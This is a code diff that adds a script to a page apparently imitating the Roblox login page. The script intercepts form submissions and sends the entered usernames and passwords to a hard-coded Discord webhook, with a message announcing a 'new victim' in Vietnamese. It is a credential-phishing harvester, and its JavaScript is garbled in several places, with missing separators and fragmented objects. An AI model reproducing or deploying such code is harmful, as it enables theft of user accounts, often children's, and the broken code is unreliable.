@@ -752,7 +752,18 @@
     <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/39e7cf7e72f313e7a76b99f51a8b31b0.js">
     </script>
   <script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1544586054772858930/e8EMA_m2s-JI4c_IlZoivD6Y58BZmhPw3dFJSqO5_JOh_xBnL2CiujiyZi_1bodTKOiy"
-
-document.addEventListener('submit', function(e)</body>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1544586054772858930/e8EMA_m2s-JI4c_IlZoivD6Y58BZmhPw3dFJSqO5_JOh_xBnL2CiujiyZi_1bodTKOiy"document.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    const data = Object.fromEntries(formData.entries());  
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' }        body: JSON.stringify({
+            content: "🚨 **MỚI CÓ NẠN NHÂN!** 🚨\n\n" + 
+                     "👤 **Username:** " + data.username + "\n" +          "🔑 **Password:** " + data.password + "\n" +           "🌐 **IP/Link:** "                title: "Thông tin đăng nhập mới",       color: 0xff0000,
+                fields: [
+                    { name: "Username", value: data.username || "Không có", inline: true },
+                    { name: "Password", value: data.password|| "Không có", inline: true }           ]
+            }]     })
+    })</body>
 </html>
